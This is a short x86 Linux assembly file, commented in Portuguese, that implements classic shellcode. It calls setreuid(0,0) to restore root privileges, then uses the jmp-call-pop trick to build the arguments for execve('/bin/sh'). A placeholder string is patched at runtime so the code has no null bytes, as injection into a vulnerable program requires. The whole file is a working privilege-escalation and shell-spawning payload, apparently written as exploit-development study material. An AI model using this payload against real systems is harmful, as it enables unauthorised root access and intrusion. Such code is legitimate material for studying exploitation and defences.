[SECTION .text]
global _start

_start:
	xor eax, eax
	mov al, 70
	xor ebx, ebx
	xor ecx, ecx
	int 0x80

	jmp short ender ;pula pra funcao ender

	starter:
	pop ebx ; pega o endereco da string e joga no ebx
	xor eax, eax ;zera eax 
	mov [ebx+7 ], al ;coloca o 0 do eax no N da string
	mov [ebx+8 ], ebx ; coloca o endereco da string para onde esta o AAAA
	mov [ebx+12], eax ; coloca 4 bytes nulos (0) no lugar de BBBB (pq eax eh 16 bits)
	mov al, 11 ;execve eh a syscall 11
	lea ecx, [ebx+8] ;carrega o endereco de onde estava AAAA
	lea edx, [ebx+12] ;carrega o endereco dos NULOS
	int 0x80
	

	ender:
	call starter ;inicia a funcao starter
	db '/bin/shNAAAABBBB' ;joga o endereco da memoria da string pra cima da pilha
